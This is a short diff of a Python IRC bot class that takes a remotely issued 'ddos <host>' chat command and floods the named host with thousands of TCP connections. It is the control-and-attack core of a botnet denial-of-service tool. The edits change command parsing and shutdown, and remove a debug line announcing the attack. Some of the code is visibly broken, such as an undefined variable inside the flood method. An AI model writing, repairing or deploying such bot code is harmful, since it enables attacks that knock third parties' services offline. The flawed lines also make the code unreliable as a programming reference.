@@ -17,22 +17,19 @@ class Toast(BaseResponder):
 			print(e)
 		return rw
 
-
 	def handle_privmsg(self, msg):
 		if self.is_command(msg):
-			command = (str(msg).split('!')[-1])
+			command = (str(msg).split('!')[1])
 			print('>>> COMMAND RECEIVED: %s' % command)
 			self.respond(msg, command + ' ok!')
 			cmd = command.split()
 			if cmd[0] == 'ddos' and cmd[1]:
 				self.dudos(host=cmd[1])
-			elif cmd[0] == 'quit':
+			elif cmd[0] == 'stop':
 				self.respond(msg, 'Bye!')
-				exit()
-
+				os._exit()
 
 	def dudos(self, host='127.0.0.1', port=8080, times=10000):
-		print('scha zadudosim ' + host)
 		self.respond(msg, 'Dudos in progress...')
 		for _ in range(times):
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
